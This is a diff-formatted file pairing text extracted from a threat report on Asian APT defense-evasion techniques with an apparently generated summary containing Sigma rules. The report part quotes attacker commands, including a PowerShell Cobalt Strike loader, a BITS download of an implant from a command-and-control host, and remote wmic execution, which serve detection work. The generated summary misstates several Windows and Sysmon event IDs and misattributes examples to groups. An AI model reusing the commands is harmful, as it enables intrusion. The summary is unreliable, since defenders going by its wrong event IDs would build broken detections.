@@ -1,0 +1,759 @@
+
+
+
+Sentence : Attacker Process Victim Process
+6
+CreateRemoteThread()
+1
+The attacker's process gets the handle of the target process and injects code into this process.
+The dwDesiredAccess attribute, which is a numerical representation of the required access, is passed as an
+argument to the OpenProcess function. To continue the attack, the attacker needs permissions to write to
+the address space of the target process, and permissions to create a thread in this process. This means that
+they need at least the following permissions: PROCESS_VM_WRITE, PROCESS_VM_READ, PROCESS_VM_
+OPERATION, PROCESS_CREATE_THREAD and PROCESS_QUERY_INFORMATION (cumulatively: 0x043A)
+To avoid wasting time checking the minimal required permissions, attackers often set the value of this attribute
+to PROCESS_ALL_ACCESS.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Process Injection T1055
+2
+Contents 148
+The second step in this attack is to allocate memory in the address space of the target process. The WinAPI
+VirtualAllocEx is used for this purpose. In contrast to VirtualAlloc, VirtualAllocEx lets you allocate memory in
+the address space of other processes, not just in the address space of the calling process. When this function
+is executed, it returns the pointer to the memory area allocated in the target process.
+3
+Then this memory area is used to write a string containing the file system path to the DLL that the attacker
+wants to load into the process.
+4
+The next step of the attacker is to get the handle of kernel32.dll. This is a library of the Windows subsystem
+that contains an implementation of the LoadLibrary function required for the attack [9] .
+5
+After getting the handle of kernel32.dll, the attacker finds the address of the LoadLibrary function using the
+GetProcAddress WinAPI function.
+6
+Then the attacker creates a thread in the target process by calling the CreateRemoteThread function. This
+function accepts several arguments, including the following:
+• hProcess is the handle of the process in which the thread is created.
+
+The attacker passes the handle that was obtained at step 1.
+
+• lpStartAddress is the address of the function with which the thread begins execution. The attacker passes
+the address of the LoadLibrary function that was obtained at step 4. The address of functions implemented
+in kernel32.dll normally remains the same in different user processes, so the address of this function in the
+attacker's process will be the same as in the target process.
+• lpParameter is the pointer to the parameters of the thread start function. The attacker uses this attribute
+to pass the address of the memory area allocated at step 2. This memory area contains a string with the
+path of the loaded DLL in the file system.
+9 Steps 4 and 5 may also be performed earlier in the attack sequence
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Process Injection T1055
+Contents 149
+Completion of this step results in generating Sysmon Event 8 (CreateRemoteThread) which will show the
+attributes listed above.
+Figure 47 CreateRemoteThread event during injection into explorer.exe
+7
+The thread begins execution in the target process starting with the LoadLibrary function, which loads the
+attacker's DLL into the address space of the process. After injection into the address space of the target
+process, the code is executed within the DllMain function of the loaded library.
+This step is reported in Sysmon Event 7 (Image loaded).
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Process Injection T1055
+Figure 48 Image Loaded event during injection into svchost.exe
+Contents 150
+Also watch out for situations in which the access token of the attacker's process has the SeDebugPrivilege in
+the enabled state. In this case, the attacker's process can gain any access to the virtual address space of the
+target process (step 1). This way, the Process Injection technique can also help elevate privileges in the system.
+When UAC is enabled, the SeDebugPrivilege can reside only in a token whose Integrity Level is High or better.
+Detection
+Let's examine the approaches to detecting Process Injection by dividing this technique into several
+subtechniques. For example, the Process Injection subtechnique examined in this section is called Dynamiclink Library Injection. It typically includes the following WinAPI sequence: [OpenProcess ›] VirtualAllocEx ›
+WriteProcessMemory › CreateRemoteThread.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Process Injection T1055
+Contents 151
+In addition to the WinAPI, host telemetry (Win Events, Sysmon) may also serve as the basis for detecting this
+subtechnique. Event 7 (Image Loaded) and Event 8 (CreateRemoteThread) can be used to create correlation
+rules:
+
+
+Injecting a DLL using LoadLibrary()
+
+
+Creating a remote thread in a critical Windows process
+
+
+Event source Log Event ID
+Sysmon Sysmon 7, 8
+SIGMA rules
+
+
+Sigma-Generic-Dynamic-link Library Injection via LoadLibrary
+
+
+Sigma-Generic-Remote Thread creation to critical Windows process
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Process Injection: Process Hollowing T1055.012
+Process Injection: Process Hollowing T1055.012
+Basic description
+Contents 152
+The most popular way to implement Process Injection among Asian APT groups is Process Hollowing. This type
+of code injection relies on the capability to create a process in the suspended state. After a process is created,
+the executable file image in the address space of the process is unmapped and the attacker's executable
+file image is written in its place. After the signal to continue execution (WinAPI ResumeThread), the process
+executes the rewritten image beginning with the entry point that was written to the EAX register.
+Security solutions often scan the executable file of a process before the process is started. This means that
+they have already concluded whether a process is "harmless" or not before the process is created, even if it is
+created in the suspended state. This helps attackers remain undetected for a longer period of time.
+The Process Hollowing mechanism can be described as follows:
+1
+The attacker creates a process in the suspended state. To do so, the value CREATE_SUSPENDED
+(0x00000004) is passed in the dwCreationFlags parameter to the CreateProcess function.
+2
+Then the attacker unmaps the image of the original executable file. The Native API function
+NtUnmapViewOfSection is normally used for this purpose. The arguments passed to this function include
+the handle of the process intended for unmapping and the address of the original executable file image that
+the attacker receives from the Process Environment Block (PEB).
+3
+Then memory is allocated for the new executable file in the target process, often by using the VirtualAllocEx
+function. The address of the image obtained at step 2 is passed to this function in the lpAddress parameter.
+4
+Then the attacker's executable file image is written to the address space of the process.
+The WriteProcessMemory function is often used for this purpose.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Process Injection: Process Hollowing T1055.012
+5
+Contents 153
+After successfully writing the image to the virtual address space of the target process, the attacker modifies
+the thread context in the image by writing the EntryPoint value of the new executable file to the EAX register.
+This may be done by using the GetThreadContext and SetThreadContext WinAPI functions, and by writing
+instructions to switch to execution of the written payload (for example, using jmp instructions).
+6
+As the last step, the attacker resumes thread execution, often by using the ResumeThread API function.
+Examples of procedures
+Example 1
+Asian APT groups regularly use the Process Hollowing technique, and C:\Windows\System32\svchost.exe is
+often the process image that they run.
+For example, in a campaign targeting a government entity in Vietnam, an Asian APT group started the svchost.
+exe process in the suspended state and attempted to write malicious code to its address space.
+Example 2
+In another campaign targeting organizations in Indonesia, attackers also attempted to start the process
+C:\Windows\System32\svchost.exe in the suspended state. In this case, the infected process c:\windows\
+help\help\meupdate.exe served as the parent process.
+Example 3
+APT groups predominantly choose legitimate processes as their target processes. In addition to svchost.exe,
+we also observed the wusa.exe process being used like in the attack targeting Malaysia.
+Parent_image_path: C:\Program Files\Common Files\VLCMedia\vlc.exe
+Image_path: C:\Windows\System32\wusa.exe
+Detection
+Use of the Process Hollowing technique can be detected based on the Process Tampering event of the
+Sysmon monitoring agent. This event occurs when the executable file image in the address space of a process
+is changed.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Process Injection: Process Hollowing T1055.012
+Figure 49 Event Symson: Process Tampering
+Contents 154
+This event often occurs when browsers are running, which should be taken into consideration when writing
+correlation rules.
+You can also distinguish and detect certain patterns, and thereby significantly reduce the attack surface for
+attackers.
+Here is an example approach that can be used to create appropriate detection logic. Here is the normal
+Windows behavior related to the svchost.exe process:
+1
+The svchost.exe image is located in the directory %WINDIR%\System32
+2
+Only the services.exe process can serve as the parent process of the svchost.exe process
+3
+The command line of the svchost.exe process will always match the template: svchost.exe -k [COMMAND]
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Process Injection: Process Hollowing T1055.012
+Contents 155
+Although any disruption of "normal" behavior can be viewed as potentially malicious activity, some companyspecific software or environments may result in false positives.
+The detection logic can be expanded by writing detection rules for anomalous behavior related to other
+processes in addition to svchost.exe.
+Event source Log Event ID
+Windows Security 4688
+Sysmon Sysmon 1, 25
+SIGMA rules
+
+
+Sigma-Generic-Executing File Named as System Tool in Unusual Directory
+
+
+Sigma-Generic-Anomaly in the Windows Critical Process Tree
+
+
+Sigma-Generic-Shell Creation by Critical Windows Process
+
+
+Sigma-Generic-Svchost.exe Start with no Standard Parameters
+
+
+Sigma-Generic-Rundll32 Start with no Standard Parameters
+
+
+Sigma-Generic-Process Hollowing
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Impair Defenses: Disable or Modify Tools T1562.001
+Detection
+Contents 157
+To detect disabling of the security solutions, you can look for process termination events and/or service state
+change events. In this case, you need to analyze any termination of processes of security solutions while
+disregarding cases in which a process was disabled for reasons unrelated to a potential attack (for example, if
+a specific security tool was restarted).
+Procedures that exploit vulnerable drivers are difficult to detect. However, you can look for driver loading
+events that contain a driver file hash. If a driver hash is on the list of vulnerable drivers that are exploited by
+attackers, you must investigate the origin of that file. This list can be compiled using multiple sources, for
+example, loldrivers [10] .
+Another detection approach is to look for events involving process creation and execution of PowerShell script
+blocks.
+Event source Log Event ID
+Windows Security 4688
+Sysmon Sysmon 1, 6, 13
+Microsoft-Windows-PowerShell/
+PowerShell 4103, 4104
+Operational
+SIGMA rules
+
+
+Sigma-Generic-Disabling Critical Service
+
+
+Sigma-Generic-Disabling SmartScreen Protection via Registry
+
+
+Sigma-Generic-Disabling Windows Defender via Dism
+
+
+Sigma-Generic-Disabling Windows Defender via Registry
+
+
+Sigma-Generic-Windows Defender Exclusions Modification via Registry
+
+
+Sigma-Generic-Windows Defender Modification via PowerShell
+
+
+10
+loldrivers
+Learn more
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Obfuscated Files or Information T1027
+Obfuscated Files or Information T1027
+Basic description
+Contents 158
+To bypass security solutions, attackers employ obfuscation. Obfuscation is a process of confusing and
+complicating. APT actors use various methods to obfuscate the contents of their malicious files. For example,
+they can encrypt or compress them, obfuscate their code, rename variables or functions to conceal their
+purpose, and insert unintelligible code or comments to hinder analysis.
+When executing commands in the Windows command line or PowerShell, attackers often try to conceal
+the execution of malicious commands. Actors replace actual commands with obfuscated versions using
+a combination of special characters. Attackers also use scripts to make it more difficult to track specific
+executable commands, and these scripts can also be additionally obfuscated.
+Methods for obfuscating the PowerShell command line employed by Asian APT groups:
+1
+Base64 encoding. Attackers often use Base64 for obfuscation. Hackers decode their Base64-encoded
+command line while executing a command by using the "-EncodedCommand" parameter or the
+FromBase64String method, for example:
+2
+Escape characters:
+a. iwr
+b. i’w’r
+c. i”w”r
+Here iwr is an alias of the Invoke-WebRequest command.
+3
+String concatenation. This method consists of breaking up PowerShell commands into multiple strings that will
+not set off alerts in security products, and then re-combining them when they are executed.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Obfuscated Files or Information T1027
+$s1 = “Invoke”
+$s2 = “-Web”
+$s3 = “Request”
+$command = $s1 + $s2 + $s3
+& $command
+Examples of procedures
+Contents 159
+Let's examine some different procedures encountered among Asian APT groups and analyze their
+obfuscation.
+Example 1
+In the incident in Pakistan that we examined, the APT group used custom-written PowerShell scripts. One
+script was used to collect data on the system, while the second script was used for data exfiltration:
+Figure 50 Custom PowerShell Script (1)
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Obfuscated Files or Information T1027
+Figure 51 Custom PowerShell Script (2)
+Contents 160
+The second script was encoded in Base64. It was decoded and executed by the first script. The contents of
+the first script were also encoded into one Base64 string and were saved to a file in a temporary directory.
+$temp\Err_36d96944_6318.log
+To run the script, the operator added the following task to the Task Scheduler:
+$system32\WindowsPowerShell\v1.0\PowerShell.EXE -c
+"$ctnt=Get-Content $temp\Err_36d96944_6318.log;PowerShell -enc $ctnt;"
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Obfuscated Files or Information T1027
+Contents 161
+Here, the contents of the $temp\Err_36d96944_6318.log file containing the encoded script are written to the
+$ctnt variable. Then PowerShell decodes the Base64 encoding by using the truncated parameter -enc from
+-EncodedCommand and runs the script.
+Example 2
+In an attack targeting Indonesia, we observed the following example of obfuscation. The executable file
+used for the service was cmd.exe with parameters for running a script in PowerShell. This script contained
+Cobalt Strike in the form of binary (shell) code with a size of ~100 bytes, was executed in the context of the
+PowerShell process, and used the Win32 API.
+"C:\Windows\system32\cmd.exe /b /c start /b /min PowerShell.exe -nop -w hidden -noni -c
+"if([IntPtr]::Size -eq 4){$b=$env:windir+
+'\sysnative\WindowsPowerShell\v1.0\PowerShell.exe'}else{$b='PowerShell.exe'};$s=NewObject System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop
+-w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object
+System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.
+Convert]::FromBase64String(''H4sIAIKCBWACA7VWa2+
+bSBT9nEj5D6iyZFAcP5I0bSJVWsY2McR2jYlxbK+1IjDA1MMjMDgm3f73vYMhTbdp....
+'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
+$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;
+$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
+Example 3
+As another example of obfuscation, GoogleUpdate.exe extracts a second-stage "Stowaway" implant by
+executing the following:
+PowerShell "Start-BitsTransfer -Source hxxp://security.lomiasecure[.]net/crx/node.txt Destination C:\Users\public\node.txt -transfertype download"
+PowerShell if($InputString = Get-Content 'C:\Users\public\node.txt'){
+The sample uses BITS Jobs to access the C2 and download the text file node.txt, which is converted into an
+executable file named node.exe (MD5: 344edbebb97ed8dfe79805a721b4048b).
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Obfuscated Files or Information T1027
+Detection
+Contents 162
+Several methods are employed to detect obfuscation. One way is to determine the entropy value, which is a
+measure of data uncertainty. When data compression or encryption algorithms are applied, the frequencies of
+occurrence of bytes are redistributed and entropy increases.
+Some PowerShell obfuscation methods can be detected based on patterns in the command line:
+
+
+Use of the EncodedCommand parameter and its truncated versions
+
+
+Use of various encryption and compression methods in PowerShell:
+
+
+FromBase64String()
+GZipStream
+Decompress
+
+Multiple use of escape characters:
+
+INVoKe-eXpResSIOn (NeW-object Net.WebClient).DownloadString
+
+Combination of line concatenation usage patterns:
+
+&('In'+'voke-Expressi'+'o'+'n') (.('New-Ob'+'jec'+'t') Net.WebClient).DownloadString
+&("{2}{3}{0}{4}{1}"-f 'e','Expression','I','nvok','-') (&("{0}{1}{2}"-f'N','ew-O','bject') Net.WebClient).
+DownloadString
+
+Commands written in reverse; variants of commands written in reverse should be added to detection rules
+for suspicious PowerShell commands:
+
+daolnwoD (Download)
+tneilCbeW (WebClient)
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Obfuscated Files or Information T1027
+Contents 163
+PowerShell is a very powerful tool that enables attackers to modify the appearance of the command line used
+to start a process so that analysts will have a very difficult time identifying command execution. attackers are
+always inventing new obfuscation techniques. New obfuscation methods are continually under development;
+therefore, you should regularly revise and update SIEM detection rules to keep up with attackers and improve
+your level of security.
+Log Event ID
+Security 4688
+Microsoft-Windows-PowerShell/Operational 4103, 4104
+Sysmon 1
+SIGMA rules
+
+
+Sigma-Generic-Encoded/decoded PowerShell Сode Execution (ps_script)
+
+
+Sigma-Generic-Obfuscation via Escape Characters in Command Line
+
+
+Sigma-Generic-XOR-ed PowerShell Command
+
+
+Sigma-Generic-XOR-ed PowerShell Command (ps_script)
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+
+
+C:\Program Files
+
+
+C:\ProgramData
+
+
+In this case, it can be rather difficult to track the creation of all executable files in these directories because
+they store a large amount of legitimate software in the operating system. The best option would be to profile
+the software that is allowed and installed on computers in your domain. Asian APT groups often prefer to
+masquerade as various IT security products, for example:
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Masquerading T1036
+MD5 File name
+4CAC6C6CAF0C849AFE8CB3DB925AB69D C:\ProgramData\avast\wsc.dll
+750EF49AFB88DDD52F6B0C500BE9B717 C:\Windows\avpui.exe
+Examples of procedures
+Contents 165
+A frequently used type of masquerading is to mimic legitimate operating system processes for the purpose
+of obstructing efforts by cybersecurity experts to analyze the system. We can distinguish similar patterns
+among Asian APT groups in this type of scenario. This behavior is primarily observed when they implement
+the techniques known as Hijack Execution Flow: DLL Side-Loading T1574.002 and Process Injection: Process
+Hollowing T1055.012 (see the Techniques section for a detailed description). The attacker delivers a malicious
+library and legitimate software to intercept a thread and run their own code in the context of a legitimate
+process, or injects code by creating a process in the suspended state. Then a process is created with a
+legitimate name, the executable file in the address space of the process is replaced, and the real malicious
+activity begins. This activity can be detected by identifying anomalies in parent and child processes in
+Windows.
+Figure 52 Detecting anomalies in parent and child processes with Kaspersky TIP
+capabilities
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Masquerading T1036
+Contents 166
+Similar anomalies can be detected in the tree of critical Windows processes after code from malicious
+libraries used by Asian APT groups is executed. This type of library was detected during an incident in a
+government-run company in Russia. It was named C:\ProgramFiles\CommonFiles\services\avg\CRYPTBASE.dll
+(MD5:AC40DD84292A7F594AD7A7DD20631D78).
+Suspicious Activity detected with Kaspersky TIP capabilities
+Figure 53
+(anomaly in the critical process tree)
+Detection
+To detect this technique, you are advised to follow the guidelines of the "Find Evil – Know Normal” [11] poster
+produced by the SANS Institute. This poster provides an illustrative guide to detect malicious activity by
+comparing normal behavior of the OS with potentially suspicious or malicious activity. It describes the normal
+behavior of a process, and legitimate combinations of child processes and parent processes. Alerts should be
+generated for events that deviate from the norm. You are advised to carefully examine our rule named "SigmaGeneric-Anomaly in the Windows Critical Process Tree," which helped us through difficult situations many
+times.
+You must also track events involving the creation of files that have a legitimate process name but an unusual
+path in the system, for example: C:\ProgramData\svchost\ svchost.exe. You can use this detection logic to
+track process creation events.
+11
+Find Evil
+Learn more
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Masquerading T1036
+Event source Log Event ID
+Windows Security 4688
+Sysmon Sysmon 1, 11
+SIGMA rules
+
+
+Sigma-Generic-Anomaly in the Windows Critical Process Tree
+
+
+Sigma-Generic-Svchost.exe Start with no Standard Parameters
+
+
+Sigma-Generic-Shell Creation by Critical Windows Process
+
+
+Sigma-Generic-Rundll32 Start with no Standard Parameters
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 167
+Technical details  |  Defense Evasion TA0005  |  Masquerading: Match Legitimate Name or Location T1036.005
+Masquerading: Match Legitimate Name or Location T1036.005
+Basic description
+Contents 168
+APT actors may disguise themselves as legitimate processes for malicious purposes. Anomalies can be
+detected in process trees (non-standard child and parent processes). Asian APT groups may also use simpler
+methods. For example, they use files with names that are identical or similar to system files on the targeted
+computer to confuse security experts.
+Suspicious Activity detcted with Kaspersky TIP capabilities
+Figure 54
+(files with the same names or similar to system ones)
+Examples of procedures
+Example 1
+WebDav-O malware at the path C:\windows\system32\conhost64.exe (conhost64.exe is a fake name, and the
+real name is C:\Windows\system32\conhost.exe).
+cmd.exe /c C: & cd\ & cd "" & dir \\c$\windows\system32\conhost64.exe
+cmd.exe /c C: & cd\ & cd "" & wmic /node: /user:\ /password:
+process call create "cmd /c $system32\conhost64.exe"
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Masquerading: Match Legitimate Name or Location T1036.005
+Example 2
+Contents 169
+In a campaign targeting a government institution in the Pacific region, an attacker used an archiver disguised
+with the name of the svchost.exe process: C:\Windows\ime\svchost.exe
+(MD5: D263D26A2BE8D971273F6C9FA2EC6608).
+C:\Windows\ime\svchost.exe a -r -hpzxcv@wsx -ta20220627 C:\Windows\ime\microsoft.dat c:*.doc
+d:*.doc e:*.doc c:*.pdf d:*.pdf e:*.pdf h:*.doc h:*.xls h:*.pdf f:*.doc f:*.xls f:*.pdf g:*.doc
+g:*.xls g:*.pdf*
+Example 3
+In January of 2022, Kaspersky ICS CERT experts detected a wave of targeted attacks against companies
+of the military-industrial complex and government institutions in several countries of Eastern Europe and
+in Afghanistan [12] . Some of the malicious programs used in these attacks were observed in earlier attacks
+conducted by the APT group known as IronHusky. These incidents also involved implementations of the
+subtechnique known as Match Legitimate Name or Location T1036.005.
+MD5 File name
+0xEBCFFECE1B1AF517743D3DFFDE72CB43 c:\programdata\conhost.exe
+0x40EB08F151859C1FE4DC8E6BC466B06F c:\programdata\uconhost.exe
+7FE40325F0CEF8A32E69A6087EBC7157 c:\programdata\install.exe
+17FA7898D040FA647AFA4467921A66CF c:\programdata\install.exe
+Example 4
+We also detected similar behavior from the ToddyCat group. This is an APT group that was detected
+in December of 2020 targeting high-ranking officials in Europe and Asia. The group deploys a multistage infection chain consisting of various custom loaders and tools. C:\Windows\avpui.exe (MD5:
+750EF49AFB88DDD52F6B0C500BE9B717) is an executable file that steals passwords from browsers and
+imitates Kaspersky Anti-Virus:
+12
+Targeted attack
+Learn more
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Masquerading: Match Legitimate Name or Location T1036.005
+Figure 55
+Malicoius file disguised as Kaspersky Anti-Virus
+Contents 170
+In this incident, we also detected a malicious file named GoogleUpdate, which created an administrative
+account on the local machine:
+C:\program files (x86)\google\update\googleupdate.exe
+Md5: b65786eaedc96827855abca996fa0836
+Detection
+The main way to detect this subtechnique is to monitor the startup of processes and creation of files that are
+named as standard system files but are located in non-standard directories. Attackers primarily try to disguise
+themselves as files located in the following directories:
+
+
+System32
+
+
+SysWOW64
+
+
+WinSxS
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Masquerading: Match Legitimate Name or Location T1036.005
+Event source Log Event ID
+Windows Security 4688
+Sysmon Sysmon 1, 11
+SIGMA rules
+
+Sigma-Generic-Executing File Named as System Tool in Unusual Directory
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 171
+Technical details  |  Defense Evasion TA0005  |  Masquerading: Masquerade Task or Service T1036.004
+Masquerading: Masquerade Task or Service T1036.004
+Basic description
+Contents 172
+This subtechnique is employed by attackers to conceal their malicious activity by imitating or substituting
+legitimate tasks or services of the operating system. Threat actors primarily modify the attributes of a task
+or service so that it looks like a normal and legitimate process or service of the operating system. They may
+modify the name or path of an executable file, command-line parameters, or other properties related to a
+process or service.
+Asian APT groups disguise services in their operations to avoid detection and evade security mechanisms.
+They may create fake tasks or services that imitate legitimate operating system components to conceal their
+activity and deceive system monitoring tools.
+Examples of procedures
+Example 1
+As described above, the APT group known as Dark Seoul used this technique to disguise its services as
+legitimate one. Services were created when executing their payload and when using the SMBExec tool.
+%SystemRoot%\System32\svchost.exe -k msupdate2
+SERVICE_CREATE
+S-1-5-18 (NT AUTHORITY\SYSTEM)
+Event : 7045
+Service Name: Windows Host Management
+Service File Name: cmd /K start C:\Windows\setup\svchost.exe
+Service Type: user mode service
+Service Start Type: auto startService Account: LocalSystem
+Event : 7045
+Service Name: Windows Service Management
+Service File Name: cmd /K start C:\Windows\setup\winhost.exe
+Service Type: user mode service
+Service Start Type: auto start
+Service Account: LocalSystem
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Masquerading: Masquerade Task or Service T1036.004
+Example 2
+Contents 173
+In a similar incident, an attacker used the WpnUserService_2727f.dll library to start a service with the same
+name as the legitimate service known as the Windows Push Notification User Service.
+Example 3
+In Russia, we detected another case in which a running library created a service with the legitimate name
+Service_name: NvContainerSvc.
+MD5 File name
+0AF1A8B5896A79FBB7A9BA551016DF8B c:\ProgramData\microsoft\nvidia\version.dll
+Based on KTAE, this sample is attributed to the MATA family with a 96% probability. MATA is a malicious
+framework for network equipment running Windows and Linux that has been used in a wide range of activity
+since 2018. It is assumed to belong to the group known as Lazarus.
+Figure 56
+Kaspersky Threat Attribution Engine report
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Masquerading: Masquerade Task or Service T1036.004
+Figure 57 Sample detonation in Kaspersky TIP
+Detection
+Contents 174
+It is difficult to detect the use of this technique because the attacker constantly invents new names and
+descriptions for their malicious tasks and services. We recommend that you monitor the creation and startup
+of services that have parts of legitimate names and descriptions but are not from their original processes.
+For example, a service that is created with the description "google" and comes from a process other than
+"$programfiles\Google\Update\GoogleUpdate.exe" most likely indicates malicious activity. Although this
+method requires efficient filtering of false positives in your specific infrastructure, it ultimately brings good
+results.
+In the description of their service, attackers often warn that their supposedly "critical" service should not be
+stopped or disabled because this would disrupt an important component in the system. You can use this trend
+to build a correlation rule that tracks the keywords "if", "stop", and "disable" in a service description.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Defense Evasion TA0005  |  Masquerading: Masquerade Task or Service T1036.004
+Event source Log Event ID
+Windows System 7045
+Windows Security 4688, 4697
+Windows TaskScheduler 106, 200, 201
+Sysmon Sysmon 1, 13
+SIGMA rules
+
+Sigma-Generic-Creating Windows Service appearing to be legitimate
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 175
+Technical details  |  Credential Access TA0006  |  OS Credential Dumping T1003
+Output : 
+### Technical Details: Defense Against APT Group Techniques in the Context of Masquerading and Obfuscation
+
+#### Introduction
+Advanced Persistent Threat (APT) groups, particularly those from Asia, employ sophisticated techniques to evade detection and maintain persistence on compromised systems. Two key tactics they use are **Masquerading** and **Obfuscation**. This document focuses on these tactics, providing examples of how APT groups implement them and offering strategies for detection and defense.
+
+### Masquerading
+
+#### Basic Description
+Masquerading involves attackers disguising their malicious activities to appear as legitimate system processes or services. This can be achieved by modifying file names, paths, service descriptions, and other attributes to blend in with the operating system's normal operations.
+
+#### Subtechniques
+
+1. **Match Legitimate Name or Location (T1036.005)**
+2. **Masquerade Task or Service (T1036.004)**
+
+### Example 1: Match Legitimate Name or Location (T1036.005)
+
+**APT Group:** Dark Seoul
+
+- **Description:** The APT group created services and tasks that mimicked legitimate system processes.
+- **Example Log Entries:**
+  - `%SystemRoot%\System32\svchost.exe -k msupdate2`
+  - `Service Name: Windows Host Management`
+  - `Service File Name: cmd /K start C:\Windows\setup\svchost.exe`
+
+### Example 2: Masquerade Task or Service (T1036.004)
+
+**APT Group:** MATA (Lazarus)
+
+- **Description:** The group created a service with the legitimate name `NvContainerSvc` to hide malicious activities.
+- **Example File:**
+  - `MD5: 0AF1A8B5896A79FBB7A9BA551016DF8B`
+  - `File Path: c:\ProgramData\microsoft\nvidia\version.dll`
+
+### Detection Strategies
+
+#### Monitoring Process and Service Creation
+- **Event Sources:** Windows Security, Sysmon, Task Scheduler
+- **Log Event IDs:**
+  - **Windows Security:**
+    - **4688:** A new process has been created.
+    - **4697:** A service was installed in the system.
+  - **Sysmon:**
+    - **1:** Process creation.
+    - **13:** Service configuration change.
+  - **Task Scheduler:**
+    - **106:** Task registered.
+    - **200:** Task started.
+    - **201:** Task completed.
+
+#### SIGMA Rules
+- **Sigma-Generic-Creating Windows Service appearing to be legitimate**
+  ```yaml
+  title: Detecting Creation of Masqueraded Services
+  id: 78d3c5e4-e6b9-4b0a-a2f2-1d6d8b2c1f3a
+  status: experimental
+  description: Detects the creation of Windows services that appear to be legitimate but are not from their original processes.
+  references:
+    - https://attack.mitre.org/techniques/T1036/
+  author: Your Name
+  date: 2023/10/05
+  tags:
+    - attack.execution
+    - attack.t1036
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image: 'C:\Windows\System32\sc.exe'
+      CommandLine|contains: 'create '
+    condition: selection
+  falsepositives:
+    - Legitimate service creation by administrators or legitimate software.
+  level: medium
+  ```
+
+### Example of Obfuscation
+
+#### Basic Description
+Obfuscation involves attackers using techniques to make their code, commands, and payloads harder to detect and analyze. This can include encoding, encryption, and the use of legitimate system tools.
+
+#### Subtechnique: Obfuscation Through Encoding (T1027)
+
+**APT Group:** IronHusky
+
+- **Description:** The group used PowerShell scripts with base64-encoded commands to execute malicious payloads.
+- **Example Command:**
+  ```powershell
+  powershell.exe -nop -w hidden -c "Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('encoded_payload')))"
+  ```
+
+### Detection Strategies
+
+#### Monitoring PowerShell Activity
+- **Event Sources:** Windows Security, Sysmon
+- **Log Event IDs:**
+  - **Windows Security:**
+    - **4104:** Script block logging.
+  - **Sysmon:**
+    - **1:** Process creation.
+    - **400:** PowerShell script block logging.
+
+#### SIGMA Rules
+- **Sigma-Generic-Detecting Base64 Encoded Commands in PowerShell**
+  ```yaml
+  title: Detecting Base64 Encoded Commands in PowerShell
+  id: 5f2d3e1a-cb8f-4c0a-a2f2-1d6d8b2c1f3a
+  status: experimental
+  description: Detects the use of base64-encoded commands in PowerShell scripts.
+  references:
+    - https://attack.mitre.org/techniques/T1027/
+  author: Your Name
+  date: 2023/10/05
+  tags:
+    - attack.execution
+    - attack.t1027
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine|contains: '-c "Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('
+    condition: selection
+  falsepositives:
+    - Legitimate use of base64 encoding in PowerShell scripts.
+  level: medium
+  ```
+
+### Conclusion
+
+Defending against APT groups requires a multi-layered approach that includes monitoring, logging, and the implementation of detection rules. By understanding the tactics used by these groups, such as masquerading and obfuscation, organizations can better prepare to identify and respond to sophisticated cyber threats.
+
+### References
+- MITRE ATT&CK: https://attack.mitre.org/
+- Kaspersky Threat Attribution Engine (KTAE): https://www.kaspersky.com/threat-intelligence-platform
+
+By staying vigilant and continuously updating detection mechanisms, organizations can significantly enhance their security posture against APT groups.
